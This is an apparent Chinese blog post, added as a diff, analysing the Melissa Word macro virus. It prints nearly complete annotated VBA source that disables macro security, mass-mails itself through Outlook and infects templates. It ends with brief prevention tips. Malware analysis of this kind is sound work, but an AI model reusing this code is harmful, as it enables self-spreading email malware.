@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="本文仅供学习，禁止另作他用！！！ 简介melissa病毒伪装成一封来自朋友或同事的电子邮件，用户打开附件中的list.doc后，病毒会让受感染的电脑向外发送50封携毒邮件，它能引发大量电子邮件，从而阻塞电子邮件服务器。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="melissa病毒">
+<meta property="og:url" content="http://yoursite.com/2020/03/24/melissa%E7%97%85%E6%AF%92/index.html">
+<meta property="og:site_name" content="eAzure">
+<meta property="og:description" content="本文仅供学习，禁止另作他用！！！ 简介melissa病毒伪装成一封来自朋友或同事的电子邮件，用户打开附件中的list.doc后，病毒会让受感染的电脑向外发送50封携毒邮件，它能引发大量电子邮件，从而阻塞电子邮件服务器。">
+<meta property="article:published_time" content="2020-03-24T09:19:25.000Z">
+<meta property="article:modified_time" content="2020-03-24T12:11:39.586Z">
+<meta property="article:author" content="eAzure">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/24/melissa病毒/"/>
+
+
+
+
+
+  <title>melissa病毒 | eAzure</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">eAzure</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/24/melissa%E7%97%85%E6%AF%92/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="eAzure">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/eAzure.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="eAzure">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">melissa病毒</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-24T17:19:25+08:00">
+                2020-03-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%97%85%E6%AF%92/" itemprop="url" rel="index">
+                    <span itemprop="name">病毒</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>本文仅供学习，禁止另作他用！！！</p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>melissa病毒伪装成一封来自朋友或同事的电子邮件，用户打开附件中的list.doc后，病毒会让受感染的电脑向外发送50封携毒邮件，它能引发大量电子邮件，从而阻塞电子邮件服务器。</p>
+<a id="more"></a>
+<p>该病毒是宏病毒，是VBA(visual basic for application)代码<br>对Word2000与Word97起作用</p>
+<h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><p><a href="https://packetstormsecurity.com/files/12131/melissa.macro.virus.txt.html" target="_blank" rel="noopener" title="参考1">参考1</a><br><a href="http://halfnet.tripod.com/virus.htm" target="_blank" rel="noopener" title="参考2">参考2</a><br><a href="https://max.book118.com/html/2018/0921/6031110140001220.shtm" target="_blank" rel="noopener" title="参考3">参考3</a></p>
+<h1 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Private Sub Document_Open()</span><br><span class="line">On Error Resume Next</span><br><span class="line">If System.PrivateProfileString(&quot;&quot;, &quot;HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security&quot;, &quot;Level&quot;) &lt;&gt; &quot;&quot; </span><br><span class="line">    Then CommandBars(&quot;Macro&quot;).Controls(&quot;Security...&quot;).Enabled &#x3D; False</span><br><span class="line">&#x2F;&#x2F;关闭宏中的安全项</span><br><span class="line">    System.PrivateProfileString(&quot;&quot;, &quot;HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security&quot;, &quot;Level&quot;) &#x3D; 1&amp;</span><br><span class="line">Else</span><br><span class="line">    CommandBars(&quot;Tools&quot;).Controls(&quot;Macro&quot;).Enabled &#x3D; False</span><br><span class="line">&#x2F;&#x2F;关闭宏选项，让用户看不到代码</span><br><span class="line">    Options.ConfirmConversions &#x3D; (1 - 1): Options.VirusProtection &#x3D; (1 - 1): Options.SaveNormalPrompt &#x3D; (1 - 1)</span><br><span class="line">三连关：关文件转换、关宏警告、关默认模板修改确认</span><br><span class="line">End If</span><br></pre></td></tr></table></figure>
+<p>该部分首先读取Windows注册表里的内容，判断该Word是不是2000，如果是就把“宏”工具栏的“安全”项设置无效；不是的话，是97的话，先把tools下的Macro（宏）选项设置为不可用，别人就看不到代码，然后把ConfirmConversions（文件转换）、VirusProtection（宏警告）和SaveNormalPrompt（模板存储确认，即normal.dot被修改了也不知道）都关了1-1=0<br>normal.dot：是Word的默认模板，Word在工作时都是基于某个模板进行的，这里病毒将默认模板也改了，所以导致以后每一次使用默认模板时，病毒都会出来判断，而在这里把修改确认给关了，就是不让用户知道默认模板被修改了，这部分在第四部分</p>
+<h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice</span><br><span class="line">Set UngaDasOutlook &#x3D; CreateObject(&quot;Outlook.Application&quot;)</span><br><span class="line">&#x2F;&#x2F;创建Outlook应用程序实例对象</span><br><span class="line">Set DasMapiName &#x3D; UngaDasOutlook.GetNameSpace(&quot;MAPI&quot;)</span><br><span class="line">&#x2F;&#x2F;获取MAPI对象</span><br><span class="line">If System.PrivateProfileString(&quot;&quot;, &quot;HKEY_CURRENT_USER\Software\Microsoft\Office\&quot;, &quot;Melissa?&quot;) &lt;&gt; &quot;... by Kwyjibo&quot; </span><br><span class="line">    Then If UngaDasOutlook &#x3D; &quot;Outlook&quot; </span><br><span class="line">        Then DasMapiName.Logon &quot;profile&quot;, &quot;password&quot;</span><br><span class="line">        For y &#x3D; 1 To DasMapiName.AddressLists.Count</span><br><span class="line">&#x2F;&#x2F;遍历地址薄</span><br><span class="line">            Set AddyBook &#x3D; DasMapiName.AddressLists(y)</span><br><span class="line">            x &#x3D; 1</span><br><span class="line">            Set BreakUmOffASlice &#x3D; UngaDasOutlook.CreateItem(0)</span><br><span class="line">            For oo &#x3D; 1 To AddyBook.AddressEntries.Count</span><br><span class="line">                Peep &#x3D; AddyBook.AddressEntries(x)</span><br><span class="line">&#x2F;&#x2F;获取第n个收件人的地址</span><br><span class="line">                BreakUmOffASlice.Recipients.Add Peep</span><br><span class="line">&#x2F;&#x2F;在地址中加入该收件人的地址</span><br><span class="line">                x &#x3D; x + 1</span><br><span class="line">                If x &gt; 50 Then oo &#x3D; AddyBook.AddressEntries.Count</span><br><span class="line">            Next oo</span><br><span class="line">            BreakUmOffASlice.Subject &#x3D; &quot;Important Message From &quot; &amp; Application.UserName</span><br><span class="line">&#x2F;&#x2F;设置邮件主题并附上用户名</span><br><span class="line">            BreakUmOffASlice.Body &#x3D; &quot;Here is that document you asked for ... don&#39;t show anyone else ;-)&quot;</span><br><span class="line">&#x2F;&#x2F;设置正文</span><br><span class="line">            BreakUmOffASlice.Attachments.Add ActiveDocument.FullName</span><br><span class="line">&#x2F;&#x2F;ActiveDocument是指正在编写的文档，所以就是这个文档，将其加入邮件的附件</span><br><span class="line">            BreakUmOffASlice.Send</span><br><span class="line">&#x2F;&#x2F;发送邮件</span><br><span class="line">            Peep &#x3D; &quot;&quot;</span><br><span class="line">        Next y</span><br><span class="line">        DasMapiName.Logoff</span><br><span class="line">&#x2F;&#x2F;断开链接</span><br><span class="line">    End If</span><br><span class="line">    System.PrivateProfileString(&quot;&quot;, &quot;HKEY_CURRENT_USER\Software\Microsoft\Office\&quot;, &quot;Melissa?&quot;) &#x3D; &quot;... by Kwyjibo&quot;</span><br><span class="line">End If</span><br></pre></td></tr></table></figure>
+<p>该部分首先判断本机是否感染，判断依据是注册表中HKEY_CURRENT_USER\Software\Microsoft\Office\这个键中是否有项”Melissa”，如果有的话啥也不做，没的话开始恶意操作<br>操作就是选取outlook邮件地址薄里的前50名好友或同事，给他们发送一封名为”Important Message From”，内容为”Here is that document you asked for … don’t show anyone else ;-)”，附件为本文件的邮件，并且在这个HKEY_CURRENT_USER\Software\Microsoft\Office\键中加入”Melissa”项，以标记被感染</p>
+<h2 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Set ADI1 &#x3D; ActiveDocument.VBProject.VBComponents.Item(1)</span><br><span class="line">&#x2F;&#x2F;ActiveDocument是指正在编写的文档，所以就是这个文档，获取当前文档的VBA工程的第1个模块名称</span><br><span class="line">Set NTI1 &#x3D; NormalTemplate.VBProject.VBComponents.Item(1)</span><br><span class="line">&#x2F;&#x2F;获取默认模板的VBA工程的第1个模块名称</span><br><span class="line">NTCL &#x3D; NTI1.CodeModule.CountOfLines</span><br><span class="line">ADCL &#x3D; ADI1.CodeModule.CountOfLines</span><br><span class="line">BGN &#x3D; 2</span><br><span class="line">If ADI1.Name &lt;&gt; &quot;Melissa&quot; </span><br><span class="line">    Then If ADCL &gt; 0 Then ADI1.CodeModule.DeleteLines 1, ADCL</span><br><span class="line">    Set ToInfect &#x3D; ADI1</span><br><span class="line">    ADI1.Name &#x3D; &quot;Melissa&quot;</span><br><span class="line">&#x2F;&#x2F;如果当前文档未感染，修改VBA工程的第1个模块名称为&quot;Melissa&quot;</span><br><span class="line">    DoAD &#x3D; True</span><br><span class="line">End If</span><br><span class="line">If NTI1.Name &lt;&gt; &quot;Melissa&quot; Then</span><br><span class="line">    If NTCL &gt; 0 Then NTI1.CodeModule.DeleteLines 1, NTCL</span><br><span class="line">    Set ToInfect &#x3D; NTI1</span><br><span class="line">    NTI1.Name &#x3D; &quot;Melissa&quot;</span><br><span class="line">&#x2F;&#x2F;如果默认模板未感染，修改VBA工程的第1个模块名称为&quot;Melissa&quot;</span><br><span class="line">    DoNT &#x3D; True</span><br><span class="line">End If</span><br><span class="line">If DoNT &lt;&gt; True And DoAD &lt;&gt; True Then GoTo CYA</span><br><span class="line">&#x2F;&#x2F;如果都感染了，跳转到CYA执行以后的命令</span><br><span class="line">If DoNT &#x3D; True </span><br><span class="line">    Then Do While ADI1.CodeModule.Lines(1, 1) &#x3D; &quot;&quot;</span><br><span class="line">        ADI1.CodeModule.DeleteLines 1</span><br><span class="line">    Loop</span><br><span class="line">    ToInfect.CodeModule.AddFromString (&quot;Private Sub Document_Close()&quot;)</span><br><span class="line">    Do While ADI1.CodeModule.Lines(BGN, 1) &lt;&gt; &quot;&quot;</span><br><span class="line">        ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)</span><br><span class="line">        BGN &#x3D; BGN + 1</span><br><span class="line">    Loop</span><br><span class="line">End If</span><br><span class="line">&#x2F;&#x2F;上述操作感染默认模板，即normal.dot</span><br><span class="line">If DoAD &#x3D; True Then</span><br><span class="line">    Do While NTI1.CodeModule.Lines(1, 1) &#x3D; &quot;&quot;</span><br><span class="line">        NTI1.CodeModule.DeleteLines 1</span><br><span class="line">    Loop</span><br><span class="line">    ToInfect.CodeModule.AddFromString (&quot;Private Sub Document_Open()&quot;)</span><br><span class="line">    Do While NTI1.CodeModule.Lines(BGN, 1) &lt;&gt; &quot;&quot;</span><br><span class="line">        ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)</span><br><span class="line">        BGN &#x3D; BGN + 1</span><br><span class="line">    Loop</span><br><span class="line">End If</span><br><span class="line">&#x2F;&#x2F;上述操作为感染当前文档</span><br><span class="line">CYA:</span><br><span class="line">If NTCL &lt;&gt; 0 And ADCL &#x3D; 0 And (InStr(1, ActiveDocument.Name, &quot;Document&quot;) &#x3D; False) </span><br><span class="line">    Then ActiveDocument.SaveAs FileName:&#x3D;ActiveDocument.FullName</span><br><span class="line">ElseIf (InStr(1, ActiveDocument.Name, &quot;Document&quot;) &lt;&gt; False) </span><br><span class="line">    Then ActiveDocument.Saved &#x3D; True</span><br><span class="line">End If</span><br><span class="line">&#x2F;&#x2F;上述操作即保存被修改的当前文档和默认模板normal.dot</span><br></pre></td></tr></table></figure>
+<p>若被melissa感染(无论是你的模板或文件)，它们的名字就会被改为Melissa，利用这个情况就可以判断出是你的模板，还是你的文档，或者两者都被感染。如果两者都被感染，它将啥都不做。否则若模板被感染，就利用模板来感染文档，所有新建的文档都会被感染；若文档被感染，就利用文档来感染模板。</p>
+<h2 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#39;WORD&#x2F;Melissa written by Kwyjibo</span><br><span class="line">&#39;Works in both Word 2000 and Word 97</span><br><span class="line">&#39;Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!</span><br><span class="line">&#39;Word -&gt; Email | Word 97 &lt;--&gt; Word 2000 ... it&#39;s a new age!</span><br><span class="line">If Day(Now) &#x3D; Minute(Now) Then Selection.TypeText &quot; Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.Game &#39;s over. I&#39;m outta here.&quot;</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
+<p>病毒作者的自述，如果当前的日期等于当前的时间，就打印” Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.Game ‘s over. I’m outta here.”</p>
+<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>对于宏病毒，最好的防范就是不启用宏<br>清理注册表、清理感染文件</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/24/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-%E7%BB%9F%E8%AE%A1%E7%94%B5%E5%BD%B1%E6%B5%B7%E6%8A%A5%E9%A2%9C%E8%89%B2/" rel="next" title="数据可视化-统计电影海报颜色">
+                <i class="fa fa-chevron-left"></i> 数据可视化-统计电影海报颜色
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/24/%E6%9E%97%E8%80%81%E5%B8%88%E4%B9%8B%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%E4%B8%89/" rel="prev" title="林老师之系统安全系列三">
+                林老师之系统安全系列三 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/eAzure.jpg"
+                alt="eAzure" />
+            
+              <p class="site-author-name" itemprop="name">eAzure</p>
+              <p class="site-description motion-element" itemprop="description">Hacker</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/eAzure" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考博客"><span class="nav-number">2.</span> <span class="nav-text">参考博客</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#源码："><span class="nav-number">3.</span> <span class="nav-text">源码：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#第一部分"><span class="nav-number">3.1.</span> <span class="nav-text">第一部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二部分"><span class="nav-number">3.2.</span> <span class="nav-text">第二部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三部分"><span class="nav-number">3.3.</span> <span class="nav-text">第三部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第四部分"><span class="nav-number">3.4.</span> <span class="nav-text">第四部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防范"><span class="nav-number">3.5.</span> <span class="nav-text">防范</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">eAzure</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).bottom&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script></body>
+</html>
